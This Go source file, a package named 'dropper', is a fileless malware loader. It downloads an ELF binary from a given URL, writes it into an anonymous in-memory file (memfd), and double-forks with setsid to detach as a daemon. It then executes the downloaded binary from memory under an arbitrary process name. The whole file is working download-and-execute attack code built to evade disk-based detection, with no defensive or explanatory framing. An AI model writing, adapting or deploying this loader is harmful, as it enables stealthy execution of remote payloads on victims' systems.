package dropper

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"syscall"

	"golang.org/x/sys/unix"
)

// Create a MemFd pointer
func MemfdCreate(name string) int {
	fmt.Printf("[+] Creating memfd %v\n", name)
	fd, err := unix.MemfdCreate(name, 0)
	if err != nil {
		fmt.Printf("MemfdCreate Error: %v\n", err)
		unix.Exit(0)
	}
	fmt.Printf("[+] FD is %v\n", fd)
	return fd
}

// Downloads ELF from URL
func RetrieveFile(url string) []byte {
	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("Error Retrieving File : %v\n", err)
		unix.Exit(0)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		print("Error Reading File : %v\n", err)
		unix.Exit(0)
	}
	return body
}

// Write Content
func WriteToMemfd(fd int, content []byte) {
	fmt.Printf("[+] Writing to MemFd\n")
	filepath := fmt.Sprintf("/proc/self/fd/%v", fd)
	if err := os.WriteFile(filepath, content, 0777); err != nil {
		fmt.Printf("Error Opening File: %v\n", err)
		unix.Exit(0)
	}
}

func ExecMemfd(fd int, procname string) {
	fmt.Print("[+] Executing Memfd\n")
	filepath := fmt.Sprintf("/proc/self/fd/%v", fd)
	args := [1]string{procname}
	env := os.Environ()
	id, _, _ := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
	if id < 0 {
		os.Exit(0)
	} else if id > 0 {
		os.Exit(0)
	}

	// Set SID and Fork Again
	_, err := syscall.Setsid()
	if err != nil {
		fmt.Println("SetSID Failed")
		os.Exit(0)
	}

	id, _, _ = syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
	if id < 0 {
		os.Exit(0)
	} else if id > 0 {
		os.Exit(0)
	}

	// Set new Perms
	syscall.Umask(0)
	syscall.Chdir("/")

	// Execute
	fmt.Printf("[+] PID Spawed : %v\n", unix.Getpid())
	err = syscall.Exec(filepath, args[:], env)
	if err != nil {
		fmt.Printf("Error Forking Process : %v", err)
		unix.Exit(0)
	}
}
